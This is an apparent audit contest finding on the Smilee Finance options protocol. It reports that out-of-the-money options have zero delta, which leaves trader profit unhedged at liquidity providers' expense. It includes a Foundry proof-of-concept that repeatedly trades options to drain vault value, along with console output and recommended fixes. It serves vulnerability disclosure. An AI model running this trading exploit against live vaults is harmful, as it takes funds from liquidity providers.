Rural Blonde Cougar

medium

# Trading out of the money options has delta = 0 which breaks protocol assumptions of traders profit being fully hedged and can result in a loss of funds to LPs

## Summary

Smilee protocol fully hedges all traders pnl by re-balancing the vault between base and side tokens after each trade. This is the assumption about this from the docs:
> This ensures Smilee has always the correct exposure to the reference tokens to:
> - Cover Impermanent Gain payoffs, no matter how much money traders earn and when they trade.
> - Ensure Liquidity Providers gets the same payoff of a DEX LP*
> - Ensure the protocol is not exposed to any shortfall.
https://docs.smilee.finance/protocol-design/delta-hedging

In the other words, any profit for traders is taken from the hedge and not from the vault Liquidity Providers funds. LP payoff must be at least the underlying DEX (Uniswap) payoff without fees with the same settings.

However, out of the money options (IG Bull when `price < strike` or IG Bear when `price > strike`) have `delta = 0`, meaning that trading such options doesn't influence vault re-balancing. Since the price of these options changes depending on current asset price, any profit gained by traders from these trades is not hedged and thus becomes the loss of the vault LPs, breaking the assumption referenced above.

As a result, LPs payout can becomes less than underlying DEX LPs payout without fees. And in extreme cases the vault funds might not be enough to cover traders payoff.

## Vulnerability Detail

When the vault delta hedges its position after each trade, it only hedges in the money options, ignoring any out of the money options. For example, this is the calculation of the IG Bull delta (`s` is the current asset price, `k` is the strike):
```solidity
    /**
        Δ_bull = (1 / θ) * F
        F = {
@@@         * 0                     if (S < K)
            * (1 - √(K / Kb)) / K   if (S > Kb)
            * 1 / K - 1 / √(S * K)  if (K < S < Kb)
        }
    */
    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {
        SD59x18 delta;
        if (s <= k) {
@@@         return 0;
        }
```

This is example scenario to demonstrate the issue:
- strike = 1
- vault has deposits = 2 (base = 1, side = 1), available liquidity: bull = 1, bear = 1
- trader buys 1 IG bear. This ensures that no vault re-balance happens when `price < strike`
- price drops to 0.9. Trader buys 1 IG bull (premium paid = 0.000038)
- price raises to 0.99. Trader sells 1 IG bull (premium received = 0.001138). Trader profit = 0.0011
- price is back to 1. Trader sells back 1 IG bear.
- at this point the vault has (base = 0.9989, side = 1), meaning LPs have lost some funds when the price = strike.

While the damage from 1 trade is not large, if this is repeated several times, the damage to LP funds will keep inceasing.

This can be especially dangerous if very long dated expiries are used, for example annual IG options. If the asset price remains below the strike for most of the time and IG Bear liquidity is close to 100% usage, then **all** IG Bull trades will be unhedged, thus breaking the core protocol assumption that traders profit should not translate to LPs loss: in such case traders profit will be the same loss for LPs. In extreme volatility, if price drops by 50% then recovers, traders can profit 3% of the vault with each trade, so after 33 trades the vault will be fully drained.

## Impact

In some specific trading conditions (IG Bear liquidity used close to 100% if price < strike, or IG Bull liquidity used close to 100% if price > strike), all or most of the traders pnl is not hedged and thus becomes loss or profit of the LPs, breaking the core protocol assumptions about hedging and in extreme cases can drain significant percentage of the vault (LPs) funds, up to a point of not being able to payout traders payoff.

## Proof Of Concept

Copy to `attack.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UD60x18, ud, convert} from "@prb/math/UD60x18.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "@project/interfaces/IPositionManager.sol";
import {Epoch} from "@project/lib/EpochController.sol";
import {AmountsMath} from "@project/lib/AmountsMath.sol";
import {EpochFrequency} from "@project/lib/EpochFrequency.sol";
import {OptionStrategy} from "@project/lib/OptionStrategy.sol";
import {AddressProvider} from "@project/AddressProvider.sol";
import {MarketOracle} from "@project/MarketOracle.sol";
import {FeeManager} from "@project/FeeManager.sol";
import {Vault} from "@project/Vault.sol";
import {TestnetToken} from "@project/testnet/TestnetToken.sol";
import {TestnetPriceOracle} from "@project/testnet/TestnetPriceOracle.sol";
import {DVPUtils} from "./utils/DVPUtils.sol";
import {TokenUtils} from "./utils/TokenUtils.sol";
import {Utils} from "./utils/Utils.sol";
import {VaultUtils} from "./utils/VaultUtils.sol";
import {MockedIG} from "./mock/MockedIG.sol";
import {MockedRegistry} from "./mock/MockedRegistry.sol";
import {MockedVault} from "./mock/MockedVault.sol";
import {TestnetSwapAdapter} from "@project/testnet/TestnetSwapAdapter.sol";
import {PositionManager} from "@project/periphery/PositionManager.sol";


contract IGTradeTest is Test {
    using AmountsMath for uint256;

    address admin = address(0x1);

    // User of Vault
    address alice = address(0x2);
    address bob = address(0x3);

    //User of DVP
    address charlie = address(0x4);
    address david = address(0x5);

    AddressProvider ap;
    TestnetToken baseToken;
    TestnetToken sideToken;
    FeeManager feeManager;

    MockedRegistry registry;

    MockedVault vault;
    MockedIG ig;
    TestnetPriceOracle priceOracle;
    TestnetSwapAdapter exchange;
    uint _strike;

    function setUp() public {
        vm.warp(EpochFrequency.REF_TS);
        //ToDo: Replace with Factory
        vm.startPrank(admin);
        ap = new AddressProvider(0);
        registry = new MockedRegistry();
        ap.grantRole(ap.ROLE_ADMIN(), admin);
        registry.grantRole(registry.ROLE_ADMIN(), admin);
        ap.setRegistry(address(registry));

        vm.stopPrank();

        vault = MockedVault(VaultUtils.createVault(EpochFrequency.WEEKLY, ap, admin, vm));
        priceOracle = TestnetPriceOracle(ap.priceOracle());

        baseToken = TestnetToken(vault.baseToken());
        sideToken = TestnetToken(vault.sideToken());

        vm.startPrank(admin);
       
        ig = new MockedIG(address(vault), address(ap));
        ig.grantRole(ig.ROLE_ADMIN(), admin);
        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);
        vault.grantRole(vault.ROLE_ADMIN(), admin);
        vm.stopPrank();
        ig.setOptionPrice(1e3);
        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1
        ig.useRealDeltaHedge();
        ig.useRealPercentage();
        ig.useRealPremium();

        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);

        vm.prank(admin);
        registry.registerDVP(address(ig));
        vm.prank(admin);
        MockedVault(vault).setAllowedDVP(address(ig));
        feeManager = FeeManager(ap.feeManager());

        exchange = TestnetSwapAdapter(ap.exchangeAdapter());
    }

    // try to buy/sell ig bull below strike for user's profit
    // this will not be hedged, and thus the vault should lose funds
    function test() public {
        _strike = 1e18;
        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), _strike);
        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);
        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);

        Utils.skipWeek(true, vm);

        vm.prank(admin);
        ig.rollEpoch();

        VaultUtils.logState(vault);
        DVPUtils.debugState(ig);

        // to ensure no rebalance from price movement
        console.log("Buy 100% IG BEAR @ 1.0");
        testBuyOption(1e18, 0, 1e18);

        for (uint i = 0; i < 20; i++) {
            // price moves down, we buy
            vm.warp(block.timestamp + 1 hours);
            console.log("Buy 100% IG BULL @ 0.9");
            testBuyOption(0.9e18, 1e18, 0);

            // price moves up, we sell
            vm.warp(block.timestamp + 1 hours);
            console.log("Sell 100% IG BULL @ 0.99");
            testSellOption(0.99e18, 1e18, 0);
        }

        // sell back original
        console.log("Sell 100% IG BEAR @ 1.0");
        testSellOption(1e18, 0, 1e18);
    }

    function testBuyOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {

        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), price);

        (uint256 premium, uint256 fee) = _assurePremium(charlie, _strike, optionAmountUp, optionAmountDown);

        vm.startPrank(charlie);
        premium = ig.mint(charlie, _strike, optionAmountUp, optionAmountDown, premium, 10e18, 0);
        vm.stopPrank();

        console.log("premium", premium);
        (uint256 btAmount, uint256 stAmount) = vault.balances();
        console.log("base token notional", btAmount);
        console.log("side token notional", stAmount);
    }

    function testSellOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {
        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), price);

        uint256 charliePayoff;
        uint256 charliePayoffFee;
        {
            vm.startPrank(charlie);
            (charliePayoff, charliePayoffFee) = ig.payoff(
                ig.currentEpoch(),
                _strike,
                optionAmountUp,
                optionAmountDown
            );

            charliePayoff = ig.burn(
                ig.currentEpoch(),
                charlie,
                _strike,
                optionAmountUp,
                optionAmountDown,
                charliePayoff,
                0.1e18
            );
            vm.stopPrank();

            console.log("payoff received", charliePayoff);
            (uint256 btAmount, uint256 stAmount) = vault.balances();
            console.log("base token notional", btAmount);
            console.log("side token notional", stAmount);
        }
    }

    function _assurePremium(
        address user,
        uint256 strike,
        uint256 amountUp,
        uint256 amountDown
    ) private returns (uint256 premium_, uint256 fee) {
        (premium_, fee) = ig.premium(strike, amountUp, amountDown);
        TokenUtils.provideApprovedTokens(admin, address(baseToken), user, address(ig), premium_*5, vm);
    }
}
```

Execution console:
```solidity
  baseToken balance 1000000000000000000
  sideToken balance 1000000000000000000
  dead false
  lockedInitially 2000000000000000000
...
  Buy 100% IG BEAR @ 1.0
  premium 6140201098441368
  base token notional 1006140201098441412
  side token notional 999999999999999956
  Buy 100% IG BULL @ 0.9
  premium 3853262173300493
  base token notional 1009993463271741905
  side token notional 999999999999999956
  Sell 100% IG BULL @ 0.99
  payoff received 4865770659690694
  base token notional 1005127692612051211
  side token notional 999999999999999956
...
  Buy 100% IG BULL @ 0.9
  premium 1827837493502948
  base token notional 984975976168184269
  side token notional 999999999999999956
  Sell 100% IG BULL @ 0.99
  payoff received 3172781130161218
  base token notional 981803195038023051
  side token notional 999999999999999956
  Sell 100% IG BEAR @ 1.0
  payoff received 3269654020920760
  base token notional 978533541017102291
  side token notional 999999999999999956
```

Notice:
1. Initial vault balance at the asset price of 1.0 is base = 1, side = 1
2. All IG Bull trades do not change vault side token balance (no re-balancing happens)
3. After 20 trades, at the asset price of 1.0, base = 0.9785, side = 1

This means that 20 profitable trades create a 1.07% loss for the vault.
Similar scenario for annual options with 50% price move shows 3% vault loss per trade.

## Code Snippet

`FinanceIGDelta.bullDelta` OTM delta = 0:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGDelta.sol#L122-L134

`FinanceIGDelta.bearDelta` OTM delta = 0:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGDelta.sol#L144-L156

## Tool used

Manual Review

## Recommendation

The issue seems to be from the approximation of the delta for OTM options. Statistically, long-term, the issue shouldn't be a problem as the long-term expectation is positive for the LPs profit due to it. However, short-term, the traders profit can create issues, and this seems to be the protocol's core assumption. Possible solution can include more precise delta calculation, maybe still approximation, but slightly more precise than the current approximation used. 

Alternatively, keep track of underlying DEX equivalent of LP payoff at the current price and if, after the trade, vault's notional is less than that, add fee = the difference, to ensure that the assumption above is always true (similar to how underlying DEX slippage is added as a fee).